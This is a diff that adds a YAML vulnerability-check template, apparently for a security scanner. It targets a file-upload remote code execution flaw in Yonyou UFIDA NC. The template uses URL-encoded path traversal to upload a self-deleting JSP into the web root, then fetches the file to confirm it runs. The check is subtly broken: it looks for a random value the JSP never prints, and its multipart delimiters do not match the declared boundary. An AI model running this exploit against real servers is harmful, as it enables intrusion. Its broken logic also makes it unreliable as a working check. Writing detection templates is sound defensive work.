@@ -1,0 +1,27 @@
+name: yonyou-UFIDA-NC-fileupload-rce
+set:
+    rboundary: randomLowercase(8)
+    randbody: randomLowercase(32)
+    randstr: randomLowercase(10)
+rules:
+  - method: POST
+    path: "/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C"
+    headers:
+      Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+    body: "\
+      ---d0b7a0d40eed0e32904c8017b09eb305\r\n\
+      Content-Disposition: form-data; name=\"file\";  filename=\"{{randstr}}.jsp\"\r\n\
+      Content-Type: text/plain\r\n\
+      \r\n\
+      <% out.println(\"{{randstr}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+      ---d0b7a0d40eed0e32904c8017b09eb305--\r\n\
+      "
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/{{randstr}}.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes({{randbody}}))
+    
+detail:
+  author: fliggy
